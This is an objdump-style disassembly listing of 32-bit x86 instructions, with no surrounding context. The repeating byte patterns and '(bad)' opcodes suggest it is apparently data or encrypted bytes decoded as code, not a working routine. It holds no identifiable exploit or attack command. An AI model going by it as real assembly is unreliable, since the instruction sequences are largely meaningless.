  41bde8:	and    eax,0x8e86c941
  41bded:	adc    dh,BYTE PTR [ebx]
  41bdef:	cmc    
  41bdf0:	std    
  41bdf1:	daa    
  41bdf2:	bound  esi,QWORD PTR [ebx]
  41bdf4:	cli    
  41bdf5:	inc    eax
  41bdf6:	inc    ecx
  41bdf7:	inc    ebx
  41bdf8:	inc    eax
  41bdf9:	add    eax,0x43406262
  41bdfe:	inc    ecx
  41bdff:	adc    BYTE PTR [eax],al
  41be01:	inc    eax
  41be02:	add    eax,0x43000562
  41be07:	add    BYTE PTR [ecx+0x40],al
  41be0a:	inc    eax
  41be0b:	add    eax,0x400062
  41be10:	inc    ebx
  41be11:	inc    eax
  41be12:	js     0x41be55
  41be14:	inc    ecx
  41be15:	bound  eax,QWORD PTR [eax+0x20]
  41be18:	push   edi
  41be19:	ret    0x2862
  41be1c:	fbstp  TBYTE PTR [eax-0x21c0d071]
  41be22:	popa   
  41be23:	inc    esi
  41be24:	add    DWORD PTR ds:0x4c4f44f5,0x86a83820
  41be2e:	push   ds
  41be2f:	mov    eax,ds:0xe4d9d5a1
  41be34:	aaa    
  41be35:	gs inc ebp
  41be37:	sub    edi,DWORD PTR [edi-0x34578b92]
  41be3d:	scas   eax,DWORD PTR es:[edi]
  41be3e:	xchg   edx,eax
  41be3f:	and    DWORD PTR [edx+0x40],esp
  41be42:	add    eax,0x40430041
  41be47:	inc    eax
  41be48:	inc    ecx
  41be49:	inc    eax
  41be4a:	inc    eax
  41be4b:	bound  eax,QWORD PTR ds:0x5624300
  41be51:	add    BYTE PTR [eax+0x40],al
  41be54:	add    BYTE PTR [ecx+0x43],al
  41be57:	add    BYTE PTR [eax+0x41],al
  41be5a:	add    eax,0x40436200
  41be5f:	inc    eax
  41be60:	add    eax,0xa1e54062
  41be65:	and    BYTE PTR [edx+0x5],0x64
  41be69:	jbe    0x41be4d
  41be6b:	shl    DWORD PTR [edx+0x6a],0x1
  41be6f:	xchg   dh,dh
  41be71:	and    eax,0x64bd9009
  41be76:	js     0x41beb4
  41be78:	inc    ecx
  41be79:	inc    eax
  41be7a:	add    eax,0x41624340
  41be7f:	test   BYTE PTR [eax],al
  41be81:	and    eax,0x404043
  41be86:	add    BYTE PTR ds:0x626210,al
  41be8c:	add    eax,0x43404140
  41be91:	inc    eax
  41be92:	inc    ecx
  41be93:	add    eax,0x10664062
  41be98:	inc    ebx
  41be99:	bound  esp,QWORD PTR [edi-0x49]
  41be9c:	fs mov edi,0xae6380c8
  41bea2:	mov    DWORD PTR [edi],esp
  41bea4:	mov    al,ds:0x9c6c6706
  41bea9:	add    eax,0xba0f878e
  41beae:	shl    BYTE PTR [edx+0x23],0x86
  41beb2:	xchg   DWORD PTR [esi],eax
  41beb4:	dec    esi
  41beb5:	push   edx
  41beb6:	fs mov dl,0xf1
  41beb9:	xor    ecx,DWORD PTR [ecx+ebp*1-0x1e]
  41bebd:	sar    al,0x60
  41bec0:	adc    eax,0x5702c3ad
  41bec5:	inc    ebx
  41bec6:	test   al,0x62
  41bec8:	add    BYTE PTR ds:0x213f81de,0x54
  41becf:	xor    al,0x7e
  41bed1:	add    eax,0x4041cc
  41bed6:	add    BYTE PTR [eax],al
  41bed8:	inc    eax
  41bed9:	inc    eax
  41beda:	inc    ebx
  41bedb:	bound  eax,QWORD PTR [eax]
  41bedd:	inc    eax
  41bede:	inc    eax
  41bedf:	add    eax,0x62434162
  41bee4:	inc    eax
  41bee5:	js     0x41bef7
  41bee7:	inc    ecx
  41bee8:	add    eax,0x5404325
  41beed:	bound  eax,QWORD PTR [eax+0x40]
  41bef0:	inc    ecx
  41bef1:	inc    ebx
  41bef2:	xchg   BYTE PTR [eax-0x4b9a8c8c],dh
  41bef8:	cmp    al,0x80
  41befa:	cmp    BYTE PTR gs:[ecx+0x65334557],al
  41bf01:	mov    ah,0xac
  41bf03:	mov    cl,0x4d
  41bf05:	cmp    DWORD PTR [ecx],eax
  41bf07:	repz data16 mov ah,0x5
  41bf0b:	xlat   BYTE PTR ds:[ebx]
  41bf0c:	sub    ebp,0x43624125
  41bf12:	add    BYTE PTR [eax],dl
  41bf14:	inc    eax
  41bf15:	add    BYTE PTR ds:0x62410040,al
  41bf1b:	inc    eax
  41bf1c:	add    BYTE PTR [ebx-0x34],al
  41bf1f:	inc    eax
  41bf20:	add    eax,0x78434040
  41bf25:	bound  eax,QWORD PTR [ecx+0x78]
  41bf28:	add    eax,0x62404043
  41bf2d:	push   ebx
  41bf2e:	push   0x57
  41bf30:	aad    0x86
  41bf32:	call   0x79bd16ad
  41bf37:	and    al,0x73
  41bf39:	cmp    al,0xe9
  41bf3b:	cmp    DWORD PTR [edi],0x80e569b0
  41bf41:	stos   DWORD PTR es:[edi],eax
  41bf42:	jge    0x41bf8b
  41bf44:	dec    eax
  41bf45:	bound  eax,QWORD PTR [edx+eax*2+0x32]
  41bf49:	add    eax,0xc5ed007e
  41bf4e:	jl     0x41bef8
  41bf50:	test   BYTE PTR [esi+0x4f563321],al
  41bf56:	push   0x10
  41bf58:	gs and al,0x59
  41bf5b:	mov    esi,0x4148f9f4
  41bf60:	inc    eax
  41bf61:	add    eax,0x43436240
  41bf66:	add    eax,0x62004040
  41bf6b:	inc    eax
  41bf6c:	add    BYTE PTR [ecx+0x40],al
  41bf6f:	inc    ebx
  41bf70:	test   BYTE PTR ds:0x58054041,ah
  41bf76:	inc    eax
  41bf77:	inc    eax
  41bf78:	bound  eax,QWORD PTR [eax+0x66]
  41bf7b:	inc    ecx
  41bf7c:	inc    eax
  41bf7d:	add    eax,0xaae04200
  41bf82:	inc    ebp
  41bf83:	dec    ecx
  41bf84:	push   esi
  41bf85:	inc    edx
  41bf86:	xchg   DWORD PTR [eax+0x1ca0565],eax
  41bf8c:	call   DWORD PTR [edx-0x23]
  41bf8f:	ret    
  41bf90:	test   eax,0x2d35286
  41bf95:	(bad)  
  41bf97:	mov    al,0x9c
  41bf99:	sub    BYTE PTR gs:[edx],cl
  41bf9c:	inc    ecx
  41bf9d:	test   BYTE PTR [eax+0x45],dl
  41bfa0:	inc    eax
  41bfa1:	test   eax,0x2e2e
  41bfa6:	inc    ebx
  41bfa7:	inc    eax
  41bfa8:	bound  eax,QWORD PTR ds:0x25404110
  41bfae:	add    ah,cl
  41bfb0:	inc    ebx
  41bfb1:	add    eax,0x40402562
  41bfb6:	add    BYTE PTR [eax+0x40],al
  41bfb9:	inc    ecx
  41bfba:	inc    ecx
  41bfbb:	add    eax,0x78434025
  41bfc0:	bound  eax,QWORD PTR [eax-0x7c]
  41bfc3:	inc    eax
  41bfc4:	inc    ecx
  41bfc5:	loopne 0x41c029
  41bfc7:	addr16 mov dl,0xef
  41bfca:	add    eax,0x1817051b
  41bfcf:	dec    esi
  41bfd0:	pusha  
  41bfd1:	cmp    eax,0x4093f286
  41bfd6:	dec    esp
  41bfd7:	and    BYTE PTR [edx+0x74],ah
  41bfda:	cmp    ecx,DWORD PTR [eax-0x1d]
  41bfdd:	mov    ah,0x41
  41bfdf:	inc    eax
  41bfe0:	inc    eax
  41bfe1:	inc    ebx
  41bfe2:	int3   
  41bfe3:	add    BYTE PTR ds:0x56240,al
  41bfe9:	inc    ebx
  41bfea:	inc    eax
  41bfeb:	inc    eax
  41bfec:	add    BYTE PTR [ecx+0x62],al
  41bfef:	bound  eax,QWORD PTR [eax]
  41bff1:	int3   
  41bff2:	inc    eax
  41bff3:	inc    ebx
  41bff4:	add    eax,0x43624041
  41bff9:	adc    BYTE PTR [ecx+0x5],al
  41bffc:	inc    eax
  41bffd:	bound  ebp,QWORD PTR [ecx]
  41bfff:	xor    eax,0x77ca818
  41c004:	jb     0x41bfa3
  41c006:	retf   
  41c007:	and    BYTE PTR [ebp+eax*1+0x43],0x36
  41c00c:	inc    ecx
  41c00d:	jle    0x41bfb7
  41c00f:	lds    ebx,FWORD PTR [esi+eax*4+0x3ba0892e]
  41c016:	or     BYTE PTR [ecx+0x5],dh
  41c019:	fs sub eax,0x7b6e0f73
  41c01f:	push   edi
  41c020:	xchg   DWORD PTR [eax-0x36],eax
  41c023:	xchg   DWORD PTR [edx+0x43],esp
  41c026:	inc    eax
  41c027:	adc    BYTE PTR ds:0x4158cc40,al
  41c02d:	inc    ebx
  41c02e:	bound  eax,QWORD PTR [ecx+0x40]
  41c031:	add    eax,0x4140
  41c036:	and    eax,0x40400062
  41c03b:	add    eax,0x84404340
  41c040:	int3   
  41c041:	js     0x41c043
  41c043:	inc    ecx
  41c044:	adc    BYTE PTR [edx+0xf],ah
  41c047:	inc    eax
  41c048:	bound  esp,QWORD PTR [edx+0x63]
  41c04b:	and    DWORD PTR [esi],ebp
  41c04d:	sbb    eax,0x23cb1435
  41c052:	adc    BYTE PTR [ecx+0x1c],al
  41c055:	jecxz  0x41bfd8
  41c057:	dec    ebp
  41c058:	xor    al,0xb8
  41c05a:	inc    edx
  41c05b:	dec    esi
  41c05c:	bound  ebx,QWORD PTR [edi]
  41c05e:	lahf   
  41c05f:	mov    ds:0xd0d9658d,al
  41c064:	test   eax,0x6255686a
  41c069:	sbb    DWORD PTR [ebx+0x4e3b864],0x0
  41c070:	inc    eax
  41c071:	inc    ecx
  41c072:	inc    eax
  41c073:	inc    ebx
  41c074:	bound  ax,DWORD PTR ds:0x40434100
  41c07b:	add    eax,0x40054062
  41c080:	bound  eax,QWORD PTR [ecx+0x40]
  41c083:	inc    ebx
  41c084:	inc    eax
  41c085:	add    eax,0x25405841
  41c08a:	bound  eax,QWORD PTR [eax+0x43]
  41c08d:	inc    eax
  41c08e:	adc    BYTE PTR [edi+0x45a8004d],bh
  41c094:	fs fwait
  41c096:	or     al,0x72
  41c098:	loopne 0x41c0fc
  41c09a:	dec    edx
  41c09b:	std    
  41c09c:	push   edx
  41c09d:	xchg   esi,eax
  41c09e:	jle    0x41c0a6
  41c0a0:	outs   dx,BYTE PTR ds:[esi]
  41c0a1:	inc    ebx
  41c0a2:	jmp    0x3d55:0x42a6267
  41c0a9:	cmp    al,0x5b
  41c0ab:	inc    edx
  41c0ac:	sbb    BYTE PTR [edi-0x7faa56cc],0xa8
  41c0b3:	lods   al,BYTE PTR ds:[esi]
  41c0b4:	lds    ecx,FWORD PTR [ecx+0x15]
  41c0b7:	cmp    ah,BYTE PTR [edx-0x58]
  41c0ba:	div    DWORD PTR [ebx+0x40]
  41c0bd:	fld    QWORD PTR [ecx]
  41c0bf:	aas    
  41c0c0:	test   BYTE PTR [ebx-0xf],cl
  41c0c3:	push   esi
  41c0c4:	inc    eax
  41c0c5:	pop    edi
  41c0c6:	jae    0x41c108
  41c0c8:	inc    ecx
  41c0c9:	inc    ebx
  41c0ca:	inc    eax
  41c0cb:	add    eax,0x43406262
  41c0d0:	inc    ecx
  41c0d1:	adc    BYTE PTR [eax],al
  41c0d3:	inc    eax
  41c0d4:	add    eax,0x43000562
  41c0d9:	add    BYTE PTR [ecx+0x40],al
  41c0dc:	inc    eax
  41c0dd:	add    eax,0x400062
  41c0e2:	inc    ebx
  41c0e3:	inc    eax
  41c0e4:	js     0x41c127
  41c0e6:	inc    ecx
  41c0e7:	bound  eax,QWORD PTR [eax+0x50]
  41c0ea:	push   eax
  41c0eb:	bound  edx,QWORD PTR ss:[edi+0x50]
  41c0ef:	aad    0x1
  41c0f1:	bound  esp,QWORD PTR [edx-0x2c]
  41c0f4:	xchg   edx,eax
  41c0f5:	int    0x51
  41c0f7:	pop    edx
  41c0f8:	inc    esi
  41c0f9:	outs   dx,DWORD PTR ds:[esi]
  41c0fa:	mov    eax,0xa8d9bf4d
  41c0ff:	dec    esi
  41c100:	or     BYTE PTR ds:0x42b44305,0x49
  41c107:	stos   DWORD PTR es:[edi],eax
  41c108:	or     DWORD PTR [edx+0x43],esp
  41c10b:	dec    eax
  41c10c:	repnz lods eax,DWORD PTR ds:[esi]
  41c10e:	xor    al,0xef
  41c110:	bound  eax,QWORD PTR [eax+0x5]
  41c113:	inc    ecx
  41c114:	add    BYTE PTR [ebx+0x40],al
  41c117:	inc    eax
  41c118:	inc    ecx
  41c119:	inc    eax
  41c11a:	inc    eax
  41c11b:	bound  eax,QWORD PTR ds:0x5624300
  41c121:	add    BYTE PTR [eax+0x40],al
  41c124:	add    BYTE PTR [ecx+0x43],al
  41c127:	add    BYTE PTR [eax+0x41],al
  41c12a:	add    eax,0x40436200
  41c12f:	inc    eax
  41c130:	add    eax,0x4821ee62
  41c135:	or     BYTE PTR [edx+0x41],ah
  41c138:	inc    esi
  41c139:	pop    ebp
  41c13a:	inc    eax
  41c13b:	adc    BYTE PTR [ebx+ecx*8+0x23da6070],al
  41c142:	pusha  
  41c143:	and    ebx,eax
  41c145:	inc    ebx
  41c146:	clc    
  41c147:	adc    BYTE PTR [eax],ah
  41c149:	outs   dx,DWORD PTR ds:[esi]
  41c14a:	enter  0x4347,0x7c
  41c14e:	bound  edx,QWORD PTR [edi+0x4f]
  41c151:	test   BYTE PTR [edx],0xb9
  41c154:	lods   eax,DWORD PTR ds:[esi]
  41c155:	dec    esp
  41c156:	sbb    ch,ch
  41c158:	add    eax,DWORD PTR fs:[ecx+0x40]
  41c15c:	add    eax,0x41624340
  41c161:	test   BYTE PTR [eax],al
  41c163:	and    eax,0x404043
  41c168:	add    BYTE PTR ds:0x626210,al
  41c16e:	add    eax,0x43404140
  41c173:	inc    eax
  41c174:	inc    ecx
  41c175:	add    eax,0x10664062
  41c17a:	inc    ebx
  41c17b:	bound  esp,QWORD PTR ds:0xb2622cab
  41c181:	pop    ecx
  41c182:	pop    ebp
  41c183:	lds    esp,FWORD PTR [ebp+0x73]
  41c186:	test   al,0x44
  41c188:	fcom   st(0)
  41c18a:	arpl   WORD PTR [edi],si
  41c18c:	and    DWORD PTR [edx+0x5e28210],0xffffffcc
  41c193:	inc    ecx
  41c194:	inc    eax
  41c195:	add    BYTE PTR [eax],al
  41c197:	add    BYTE PTR [eax+0x40],al
  41c19a:	inc    ebx
  41c19b:	bound  eax,QWORD PTR [eax]
  41c19d:	inc    eax
  41c19e:	inc    eax
  41c19f:	add    eax,0x62434162
  41c1a4:	inc    eax
  41c1a5:	js     0x41c1b7
  41c1a7:	inc    ecx
  41c1a8:	add    eax,0x5404325
  41c1ad:	bound  eax,QWORD PTR [eax+0x40]
  41c1b0:	inc    ecx
  41c1b1:	inc    ebx
  41c1b2:	jne    0x41c1c1
  41c1b4:	out    0x49,al
  41c1b6:	sub    ebp,DWORD PTR [ebx+eax*8-0x5c7f8f9d]
  41c1bd:	xor    DWORD PTR ds:0x53af042a,0x61f4b416
  41c1c7:	mov    ebx,0x58b020fb
  41c1cc:	cld    
  41c1cd:	sbb    DWORD PTR [esp+eiz*2],0x62
  41c1d1:	iret   
  41c1d2:	test   al,0xd
  41c1d4:	push   0x2a56a24a
  41c1d9:	les    edx,FWORD PTR [eax]
  41c1db:	fimul  WORD PTR [esi+0x2]
  41c1de:	pop    ds
  41c1df:	inc    esi
  41c1e0:	cmc    
  41c1e1:	mov    eax,0x6fb0647c
  41c1e6:	inc    ebp
  41c1e7:	and    eax,0x436241
  41c1ec:	adc    BYTE PTR [eax+0x0],al
  41c1ef:	add    eax,0x62410040
  41c1f4:	inc    eax
  41c1f5:	add    BYTE PTR [ebx-0x34],al
  41c1f8:	inc    eax
  41c1f9:	add    eax,0x78434040
  41c1fe:	bound  eax,QWORD PTR [ecx+0x78]
  41c201:	add    eax,0x62404043
  41c206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c207:	sub    DWORD PTR ds:0x2e9b2002,eax
  41c20d:	mov    ds:0xcbcb629f,al
  41c212:	addr16 int3 
  41c214:	gs xor al,0x74
  41c217:	inc    ebx
  41c218:	mov    al,0xbc
  41c21a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c21b:	mov    eax,DWORD PTR [edx]
  41c21d:	dec    edi
  41c21e:	test   al,0x30
  41c220:	inc    ecx
  41c221:	inc    eax
  41c222:	add    eax,0x43436240
  41c227:	add    eax,0x62004040
  41c22c:	inc    eax
  41c22d:	add    BYTE PTR [ecx+0x40],al
  41c230:	inc    ebx
  41c231:	test   BYTE PTR ds:0x58054041,ah
  41c237:	inc    eax
  41c238:	inc    eax
  41c239:	bound  eax,QWORD PTR [eax+0x66]
  41c23c:	inc    ecx
  41c23d:	inc    eax
  41c23e:	add    eax,0x5159b00
  41c243:	pop    edi
  41c244:	cmp    DWORD PTR [edx],esp
  41c246:	loopne 0x41c1e8
  41c248:	pop    edi
  41c249:	inc    ebp
  41c24a:	retf   
  41c24b:	cmp    eax,DWORD PTR [edx-0xb]
  41c24e:	sub    ebp,DWORD PTR [eax+0x304059dc]
  41c254:	add    BYTE PTR [edx],dh
  41c256:	bound  edx,QWORD PTR [eax]
  41c258:	xor    DWORD PTR [eax+0x252d5c41],esi
  41c25e:	jb     0x41c2c9
  41c260:	rol    BYTE PTR [ecx],0xd
  41c263:	ja     0x41c22c
  41c265:	popa   
  41c266:	dec    edi
  41c267:	scas   eax,DWORD PTR es:[edi]
  41c268:	pop    edi
  41c269:	test   al,0x10
  41c26b:	pop    ds
  41c26c:	or     bh,BYTE PTR [esi-0xb]
  41c26f:	bound  edi,QWORD PTR [ebp+esi*1+0x40430000]
  41c276:	bound  eax,QWORD PTR ds:0x25404110
  41c27c:	add    ah,cl
  41c27e:	inc    ebx
  41c27f:	add    eax,0x40402562
  41c284:	add    BYTE PTR [eax+0x40],al
  41c287:	inc    ecx
  41c288:	inc    ecx
  41c289:	add    eax,0x78434025
  41c28e:	bound  eax,QWORD PTR [eax-0x7c]
  41c291:	inc    eax
  41c292:	inc    ecx
  41c293:	bound  eax,QWORD PTR ds:0x456b61a0
  41c299:	dec    esi
  41c29a:	retf   
  41c29b:	and    ebp,DWORD PTR [edx+0x43bc4352]
  41c2a1:	mov    al,ds:0x1ad346c
  41c2a6:	pusha  
  41c2a7:	bound  ecx,QWORD PTR [eax+0x6e]
  41c2aa:	xor    al,0x40
  41c2ac:	aas    
  41c2ad:	inc    ecx
  41c2ae:	inc    eax
  41c2af:	inc    eax
  41c2b0:	inc    ebx
  41c2b1:	int3   
  41c2b2:	add    BYTE PTR ds:0x56240,al
  41c2b8:	inc    ebx
  41c2b9:	inc    eax
  41c2ba:	inc    eax
  41c2bb:	add    BYTE PTR [ecx+0x62],al
  41c2be:	bound  eax,QWORD PTR [eax]
  41c2c0:	int3   
  41c2c1:	inc    eax
  41c2c2:	inc    ebx
  41c2c3:	add    eax,0x43624041
  41c2c8:	adc    BYTE PTR [ecx+0x5],al
  41c2cb:	inc    eax
  41c2cc:	adc    eax,0x1b7ca80e
  41c2d1:	pop    esi
  41c2d2:	mov    al,ds:0x1041cd32
  41c2d7:	inc    edi
  41c2d8:	and    al,0x2f
  41c2da:	cmp    eax,0xbd208260
  41c2df:	arpl   WORD PTR [edx+0x67],dx
  41c2e2:	ret    
  41c2e3:	xor    al,0x2d
  41c2e5:	add    DWORD PTR [edx-0x5],edx
  41c2e8:	mov    esp,0x57a54d34
  41c2ed:	inc    eax
  41c2ee:	bound  ebx,QWORD PTR [edi+eiz*1+0x4c]
  41c2f2:	xor    al,0x35
  41c2f4:	xor    BYTE PTR [edx+eiz*2],0x43
  41c2f8:	inc    eax
  41c2f9:	adc    BYTE PTR ds:0x4158cc40,al
  41c2ff:	inc    ebx
  41c300:	bound  eax,QWORD PTR [ecx+0x40]
  41c303:	add    eax,0x4140
  41c308:	and    eax,0x40400062
  41c30d:	add    eax,0x84404340
  41c312:	int3   
  41c313:	js     0x41c315
  41c315:	inc    ecx
  41c316:	adc    BYTE PTR [edx+0xf],ah
  41c319:	ins    BYTE PTR es:[edi],dx
  41c31a:	(bad)  
  41c31b:	aad    0x5
  41c31d:	inc    eax
  41c31e:	sub    BYTE PTR [esi],ch
  41c320:	or     eax,0x7b524482
  41c325:	lods   al,BYTE PTR ds:[esi]
  41c326:	retf   0x4080
  41c329:	ret    
  41c32a:	sub    cl,bl
  41c32c:	add    al,0x3d
  41c32e:	pop    ds
  41c32f:	add    ebx,DWORD PTR [edi]
  41c331:	mov    esp,0xc3024290
  41c336:	out    dx,eax
  41c337:	pop    ecx
  41c338:	inc    ecx
  41c339:	inc    ecx
  41c33a:	mov    edi,0x7534486
  41c33f:	add    DWORD PTR [eax+0x58],esp
  41c342:	jo     0x41c30e
  41c344:	push   edx
  41c345:	add    BYTE PTR [eax+0x41],al
  41c348:	inc    eax
  41c349:	inc    ebx
  41c34a:	bound  ax,DWORD PTR ds:0x40434100
  41c351:	add    eax,0x40054062
  41c356:	bound  eax,QWORD PTR [ecx+0x40]
  41c359:	inc    ebx
  41c35a:	inc    eax
  41c35b:	add    eax,0x25405841
  41c360:	bound  eax,QWORD PTR [eax+0x43]
  41c363:	inc    eax
  41c364:	adc    BYTE PTR [eax-0xa],cl
  41c367:	pop    edx
  41c368:	add    ebx,eax
  41c36a:	inc    edx
  41c36b:	(bad)  
  41c36c:	lock sub BYTE PTR [ebp+0x8],bl
  41c370:	sub    DWORD PTR [ebx+0x78],edx
  41c373:	push   eax
  41c374:	xor    al,0xc4
  41c376:	repz sub DWORD PTR [eax+0x28],esp
  41c37a:	enter  0x38f3,0x6e
  41c37e:	es out dx,al
  41c380:	push   ss
  41c381:	push   eax
  41c382:	(bad)  
  41c383:	leave  
  41c384:	inc    edx
  41c385:	fcomp  QWORD PTR [edx+0x5c6640da]
  41c38b:	push   edx
  41c38c:	xchg   esp,eax
  41c38d:	test   BYTE PTR fs:[ebp+0x40bd1454],0x6a
  41c395:	mov    eax,0x35126787
  41c39a:	test   al,0xbc
  41c39c:	inc    eax
  41c39d:	inc    ecx
  41c39e:	inc    ebx
  41c39f:	inc    eax
  41c3a0:	add    eax,0x43406262
  41c3a5:	inc    ecx
  41c3a6:	adc    BYTE PTR [eax],al
  41c3a8:	inc    eax
  41c3a9:	add    eax,0x43000562
  41c3ae:	add    BYTE PTR [ecx+0x40],al
  41c3b1:	inc    eax
  41c3b2:	add    eax,0x400062
  41c3b7:	inc    ebx
  41c3b8:	inc    eax
  41c3b9:	js     0x41c3fc
  41c3bb:	inc    ecx
  41c3bc:	bound  eax,QWORD PTR [eax+0x39]
  41c3bf:	test   al,0x4b
  41c3c1:	pop    DWORD PTR [eax-0x80]
  41c3c4:	or     ecx,DWORD PTR [esi+edx*2]
  41c3c7:	adc    BYTE PTR [edi+0x6d],al
  41c3ca:	add    eax,0xf53233c5
  41c3cf:	mov    ah,0x12
  41c3d1:	add    DWORD PTR [eax+0x41],0xb
  41c3d5:	inc    eax
  41c3d6:	and    al,BYTE PTR ds:0x42131e6c
  41c3dc:	sub    al,0xb4
  41c3de:	sub    bl,cl
  41c3e0:	xchg   ebx,eax
  41c3e1:	add    DWORD PTR [eax-0x40],0x62
  41c3e5:	inc    eax
  41c3e6:	add    eax,0x40430041
  41c3eb:	inc    eax
  41c3ec:	inc    ecx
  41c3ed:	inc    eax
  41c3ee:	inc    eax
  41c3ef:	bound  eax,QWORD PTR ds:0x5624300
  41c3f5:	add    BYTE PTR [eax+0x40],al
  41c3f8:	add    BYTE PTR [ecx+0x43],al
  41c3fb:	add    BYTE PTR [eax+0x41],al
  41c3fe:	add    eax,0x40436200
  41c403:	inc    eax
  41c404:	add    eax,0x663d6262
  41c409:	inc    ebx
  41c40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c40b:	inc    ecx
  41c40c:	gs mov esp,0x4438c3b0
  41c412:	cmp    eax,0x76f67803
  41c417:	fisubr DWORD PTR [eax+0x2132d1fc]
  41c41d:	push   ebx
  41c41e:	and    DWORD PTR [ebx+0x70d6445],ebp
  41c424:	inc    ecx
  41c425:	and    dh,BYTE PTR [eax-0x3c57d5bd]
  41c42b:	sbb    BYTE PTR [edx-0x3d],dl
  41c42e:	adc    eax,0xa842417f
  41c433:	add    BYTE PTR [eax+0x416cc9bc],ah
  41c439:	inc    eax
  41c43a:	add    eax,0x41624340
  41c43f:	test   BYTE PTR [eax],al
  41c441:	and    eax,0x404043
  41c446:	add    BYTE PTR ds:0x626210,al
  41c44c:	add    eax,0x43404140
  41c451:	inc    eax
  41c452:	inc    ecx
  41c453:	add    eax,0x10664062
  41c458:	inc    ebx
  41c459:	bound  ecx,QWORD PTR [ecx]
  41c45b:	sub    dh,BYTE PTR [edx+0x2c]
  41c45e:	and    eax,0x6669a1
  41c463:	inc    ecx
  41c464:	idiv   BYTE PTR [esi+0x10fb7244]
  41c46a:	bound  edx,QWORD PTR [ebx-0x35]
  41c46d:	xor    al,0xe1
  41c46f:	bound  esp,QWORD PTR [edx-0x68]
  41c472:	test   eax,0x530b3c34
  41c477:	inc    esp
  41c478:	add    eax,0x4041cc
  41c47d:	add    BYTE PTR [eax],al
  41c47f:	inc    eax
  41c480:	inc    eax
  41c481:	inc    ebx
  41c482:	bound  eax,QWORD PTR [eax]
  41c484:	inc    eax
  41c485:	inc    eax
  41c486:	add    eax,0x62434162
  41c48b:	inc    eax
  41c48c:	js     0x41c49e
  41c48e:	inc    ecx
  41c48f:	add    eax,0x5404325
  41c494:	bound  eax,QWORD PTR [eax+0x40]
  41c497:	inc    ecx
  41c498:	inc    ebx
  41c499:	lds    esp,FWORD PTR [eax+esi*4+0x12]
  41c49d:	rol    DWORD PTR [edi],0xa1
  41c4a0:	inc    esi
  41c4a1:	push   esp
  41c4a2:	push   ds
  41c4a3:	shl    DWORD PTR [ecx+ebp*1-0x34debe7f],1
  41c4aa:	sar    BYTE PTR [esi-0x3a],1
  41c4ad:	in     al,dx
  41c4ae:	inc    eax
  41c4af:	pusha  
  41c4b0:	push   0x48
  41c4b2:	shl    BYTE PTR [esi+ebp*1+0xf],1
  41c4b6:	add    BYTE PTR [esi-0x29],ch
  41c4b9:	inc    ecx
  41c4ba:	test   al,0x14
  41c4bc:	push   ecx
  41c4bd:	sub    ah,BYTE PTR [esi]
  41c4bf:	outs   dx,DWORD PTR ds:[esi]
  41c4c0:	scas   al,BYTE PTR es:[edi]
  41c4c1:	inc    esp
  41c4c2:	xor    esi,DWORD PTR [esp+eax*2-0x47]
  41c4c6:	inc    edi
  41c4c7:	and    BYTE PTR [edx],ah
  41c4c9:	sub    BYTE PTR [esi+0x62],ah
  41c4cc:	leave  
  41c4cd:	and    eax,0x436241
  41c4d2:	adc    BYTE PTR [eax+0x0],al
  41c4d5:	add    eax,0x62410040
  41c4da:	inc    eax
  41c4db:	add    BYTE PTR [ebx-0x34],al
  41c4de:	inc    eax
  41c4df:	add    eax,0x78434040
  41c4e4:	bound  eax,QWORD PTR [ecx+0x78]
  41c4e7:	add    eax,0x62404043
  41c4ec:	push   ebx
  41c4ed:	add    DWORD PTR [esi+0x62],edi
  41c4f0:	fsub   QWORD PTR [ebx+0x24]
  41c4f3:	adc    dl,BYTE PTR es:[ebx]
  41c4f6:	cli    
  41c4f7:	retf   
  41c4f8:	cld    
  41c4f9:	sar    DWORD PTR [eax],0xb4
  41c4fc:	mov    ebx,0xa8487d85
  41c501:	push   esp
  41c502:	or     ax,0x43d4
  41c506:	popa   
  41c507:	inc    ecx
  41c508:	inc    eax
  41c509:	add    eax,0x43436240
  41c50e:	add    eax,0x62004040
  41c513:	inc    eax
  41c514:	add    BYTE PTR [ecx+0x40],al
  41c517:	inc    ebx
  41c518:	test   BYTE PTR ds:0x58054041,ah
  41c51e:	inc    eax
  41c51f:	inc    eax
  41c520:	bound  eax,QWORD PTR [eax+0x66]
  41c523:	inc    ecx
  41c524:	inc    eax
  41c525:	add    eax,0xcd401300
  41c52a:	push   ebp
  41c52b:	inc    ebx
  41c52c:	mov    es,WORD PTR [ecx-0x4bd5e1dc]
  41c532:	cmp    al,0x1a
  41c534:	neg    BYTE PTR [edx]
  41c536:	xor    dl,BYTE PTR [ebx+0x11]
  41c539:	or     eax,0x8150c063
  41c53e:	sub    bl,ah
  41c540:	inc    eax
  41c541:	retf   
  41c542:	mov    esp,0x24af92f8
  41c547:	test   al,0x1
  41c549:	inc    ebx
  41c54a:	pusha  
  41c54b:	add    BYTE PTR [eax],al
  41c54d:	inc    ebx
  41c54e:	inc    eax
  41c54f:	bound  eax,QWORD PTR ds:0x25404110
  41c555:	add    ah,cl
  41c557:	inc    ebx
  41c558:	add    eax,0x40402562
  41c55d:	add    BYTE PTR [eax+0x40],al
  41c560:	inc    ecx
  41c561:	inc    ecx
  41c562:	add    eax,0x78434025
  41c567:	bound  eax,QWORD PTR [eax-0x7c]
  41c56a:	inc    eax
  41c56b:	inc    ecx
  41c56c:	inc    eax
  41c56d:	mov    al,ds:0x25112f4b
  41c572:	fwait
  41c573:	xor    BYTE PTR [ecx-0x4f9b7f6c],dh
  41c579:	sbb    BYTE PTR [eax],0x6a
  41c57c:	ins    BYTE PTR es:[edi],dx
  41c57d:	add    DWORD PTR [eax-0x60],esp
  41c580:	inc    ecx
  41c581:	dec    ebp
  41c582:	arpl   WORD PTR ds:0x372ee50c,ax
  41c588:	gs retf 
  41c58a:	lock imul esp,DWORD PTR gs:[edi+0x36306e81],0xffffffe7
  41c593:	xchg   edx,eax
  41c594:	jne    0x41c53a
  41c596:	inc    ecx
  41c597:	inc    eax
  41c598:	inc    eax
  41c599:	inc    ebx
  41c59a:	int3   
  41c59b:	add    BYTE PTR ds:0x56240,al
  41c5a1:	inc    ebx
  41c5a2:	inc    eax
  41c5a3:	inc    eax
  41c5a4:	add    BYTE PTR [ecx+0x62],al
  41c5a7:	bound  eax,QWORD PTR [eax]
  41c5a9:	int3   
  41c5aa:	inc    eax
  41c5ab:	inc    ebx
  41c5ac:	add    eax,0x43624041
  41c5b1:	adc    BYTE PTR [ecx+0x5],al
  41c5b4:	inc    eax
  41c5b5:	arpl   WORD PTR [ecx],sp
